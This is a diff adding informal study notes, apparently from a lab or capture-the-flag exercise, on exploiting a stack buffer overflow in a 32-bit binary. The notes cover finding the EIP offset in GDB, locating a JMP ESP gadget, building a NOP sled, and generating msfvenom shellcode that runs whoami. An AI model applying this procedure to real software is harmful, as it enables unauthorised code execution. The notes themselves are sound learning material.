@@ -357,6 +357,84 @@ from this we know it wants a string, is an ELF 32 bit
 // yellow -> address allocation within the stack
 
 
+// back in GDB, run <<<#(python ./func.py) 
+// you will be looking for 'EIP' when the file returns a segfault
+
+// go to wiremask.eu/tools/buffer-overflow-pattern-genetator/
+// change from a * 100 in the python script to the value from ^^^^^
+// run again
+
+now find the EIP again, exclude the 0x
+
+put the rest of the EIP into the `register value` under `find the offset` in wiremask
+it will return an offset of 62 for example
+
+go back into the script and change the offset = "A" * 62
+
+now add a variable to the python script called 'eip'
+eip = "B" * 4
+( 4 is how many bytes eip took up )
+// `\x59` `\x3b` `\xde` `\xf7` .. there is 4 bytes
+
+include into the print
+print (offset + eip)
+
+run the script again within the GDB and the EIP should change
+
+now.. getting a little lost ..
+
+
+find the JMP ESP location:
+get out of the GDB using `shell` and in the terminal write: `env - gdb ./func'
+
+run within ^^^^^^ :
+unset env LINES
+unset env COLUMNS
+show env // verify nothing is there
+
+// this is to clean the environment
+
+run: 
+`run` ( use ctrl c ) // run just runs it ; use this
+OR 
+`start` // start allows breakpoints
+
+run: `info proc map`
+look for HEAP && STACK
+when you see the heap, go to the next memory access // DIRECTLY AFTER (down one) (FIRST COLUMN)
+when you see the stack, go the last memory access (within the same line) (SECOND COLUMN)
+sometimes you wont see both the heap and the stack so just type `step` until you see it, if you use `run` you shouldnt worry about this
+
+now we find the jump... using `find /b <address (heap/stack)
+
+find /b heap addr, stack addr, 0xff, 0xe4
+// will blurt out a list, copy them all or just the first FIVE and document
+convert them into little_endian (flip the text pretty much (invert))
+example: 0xf7de3b59
+f7 de 3b 59 > \x59\x3b\xde\xf7
+
+
+put into the eip variable in the func.py file
+eip = "\x59\x3b\xde\xf7"
+then add a nop variable
+nop = "\x90" * 15
+
+make sure to print all of it (offset + eip + nop)
+
+
+// now make our payload
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
+bad bytes chars do not change ( after the -b )
+
+
+
+
+copy the output into the python script (ALL OF IT)
+run again `./func <<<$(python ./func.py)
+
+
+
+
 
 
 
